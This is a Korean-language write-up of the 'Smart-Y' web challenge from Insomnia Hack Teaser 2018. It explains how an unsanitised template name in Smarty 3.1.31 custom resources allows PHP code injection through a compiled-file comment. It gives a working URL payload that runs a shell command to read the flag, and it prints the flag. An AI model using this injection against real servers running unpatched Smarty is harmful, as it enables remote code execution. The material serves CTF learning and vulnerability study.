# [WEB] Insomnia Hack Teaser 2018 - Smart-Y

## Description

Last year, a nerd destroyed the system of Robot City by using some evident flaws. It seems that the system has changed and is not as evident to break now.

[http://smart-y.teaser.insomnihack.ch](http://smart-y.teaser.insomnihack.ch/)

Important : you don't need to use automated scanners or bruteforce for this challenge, and using some will result for your ip to be banned. Go on IRC to ask for being unbanned.

## Analysis

페이지에 접속하면 별 내용이 없다.

다음 페이지로 이동하다보면 아래의 페이지에 `Location`되고, \<\<\<DEBUG\>\>\>를 누르면 소스코드를 볼 수 있다.

```Php
/* 
	http://smart-y.teaser.insomnihack.ch/console.php
*/
<?php 

if(isset($_GET['hl'])){ highlight_file(__FILE__); exit; } 
include_once('./smarty/libs/Smarty.class.php'); 
define('SMARTY_COMPILE_DIR','/tmp/templates_c'); 
define('SMARTY_CACHE_DIR','/tmp/cache'); 
  
  
class news extends Smarty_Resource_Custom 
{ 
    protected function fetch($name,&$source,&$mtime) 
    { 
        $template = "The news system is in maintenance. Please wait a year. <a href='/console.php?hl'>".htmlspecialchars("<<<DEBUG>>>")."</a>"; 
        $source = $template; 
        $mtime = time(); 
    } 
} 
  
// Smarty configuration 
$smarty = new Smarty(); 
$my_security_policy = new Smarty_Security($smarty); 
$my_security_policy->php_functions = null; 
$my_security_policy->php_handling = Smarty::PHP_REMOVE; 
$my_security_policy->modifiers = array(); 
$smarty->enableSecurity($my_security_policy); 
$smarty->setCacheDir(SMARTY_CACHE_DIR); 
$smarty->setCompileDir(SMARTY_COMPILE_DIR); 


$smarty->registerResource('news',new news); 
$smarty->display('news:'.(isset($_GET['id']) ? $_GET['id'] : ''));  
```

smarty라는 Open Source를 사용하는 것을 확인할 수 있다.

>  주소 : https://github.com/smarty-php/smarty

smarty는 `change_log.txt`파일을 포함하고 있으므로 문제서버에 요청해보았다.

```
/*
	smarty/change_log.txt in Problem Server
*/
===== 3.1.31 ===== (14.12.2016)
  23.11.2016
   - move template object cache into static variables

  19.11.2016
  - bugfix inheritance root child templates containing nested {block}{/block} could call sub-bock content from parent
    template https://github.com/smarty-php/smarty/issues/317
  - change version checking
... 생략 ...
```

문제 서버에 적용된 smarty는 2016년 12월 14일이 최종 패치 내역인것을 확인하였다.

github에 올라온 최신버전의 change_log.txt를 보면 다음과 같다.

```
/*
	smarty/change_log.txt in Github
*/
===== 3.1.32 - dev ===
22.11.2017
 - bugfix {break} and {continue} could fail if {foreach}{/foreach} did contain other
   looping tags like {for}, {section} and {while} https://github.com/smarty-php/smarty/issues/323
	...생략...
21.7.2017
  - security possible PHP code injection on custom resources at display() or fetch()
    calls if the resource does not sanitize the template name
  - bugfix fix 'mkdir(): File exists' error on create directory from parallel
    processes https://github.com/smarty-php/smarty/pull/377
  - bugfix solve preg_match() hhvm parameter problem https://github.com/smarty-php/smarty/pull/372
	...생략...
```

문제 서버에 올라간 버전과는 다르게 2017년 11월 22일이 최신 패치 내역인 것을 확인하였고, 2017년 7월 21일자로 custom resources의 disaplay와 fetch함수에서 code injection이 패치되었다.

로컬에 구축하여 서버에 접속할 시 생성되는 compile된 파일을 보면 다음과 같다.

```php
/*
	http://127.0.0.1/insom/?id=1
*/
<?php
/* Smarty version 3.1.31, created on 2018-01-23 04:45:53
  from "news:1" */

/* @var Smarty_Internal_Template $_smarty_tpl */
if ($_smarty_tpl->_decodeProperties($_smarty_tpl, array (
  'version' => '3.1.31',
  'unifunc' => 'content_5a66be01111e71_89031357',
  'has_nocache_code' => false,
  'file_dependency' =>
  array (
    '285ca3c40e8861da88e32ce7a4f5ccb78af23842' =>
    array (
      0 => 'news:1',
      1 => 1516682753,
      2 => 'news',
    ),
  ),
  'includes' =>
  array (
  ),
),false)) {
function content_5a66be01111e71_89031357 (Smarty_Internal_Template $_smarty_tpl) {
?>
The news system is in maintenance. Please wait a year. <a href='/insom/index.php?hl'>&lt;&lt;&lt;DEBUG&gt;&gt;&gt;</a><?php }
}
```

`$smarty->display('news:'.(isset($_GET['id']) ? $_GET['id'] : '')); `에 의해 작성된 `news:ANYTING`가 compile된 파일의 주석 부분에 들어가는 것을 확인할 수 있다.

```php
/* Smarty version 3.1.31, created on 2018-01-23 04:45:53
  from "news:1" */
```

## Exploit

파라미터 id의 값에 대한 필터링이 존재하지 않으므로 id의 값을 주석 ( \*/ \~\~\~ /\* )로 주면 \~\~\~ 부분에 php 코드 인젝션이 가능하다.

즉, id파라미터를 통해 쉘 커맨드를 실행하는 php 코드를 삽입하여 플래그를 얻을 수 있다. ~~Profit!~~

```Html
<!--
	http://smart-y.teaser.insomnihack.ch/console.php?id=1*/echo%20`cat%20/flag`;/*
-->
INS{why_being_so_smart-y} The news system is in maintenance. Please wait a year. <<<DEBUG>>>
```



**INS{why_being_so_smart-y}**